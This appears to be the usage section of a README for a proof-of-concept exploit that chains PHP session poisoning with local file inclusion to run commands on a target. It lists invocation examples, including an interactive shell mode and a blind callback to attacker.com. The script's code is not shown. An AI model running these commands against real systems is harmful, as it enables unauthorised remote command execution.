Usage
```
python3 poc.py <url> <command> [OPTIONS]

# Session poison + auto-detected LFI
python3 poc.py http://target.example.com/index.php "id"

# Specify LFI parameter
python3 poc.py http://target.example.com/ "id" --lfi-param page

# Interactive shell
python3 poc.py http://target.example.com/ "id" -i

# Blind callback (no LFI needed on target side)
python3 poc.py http://target.example.com/ "id" --callback http://attacker.com/
```

Writeup coming soon
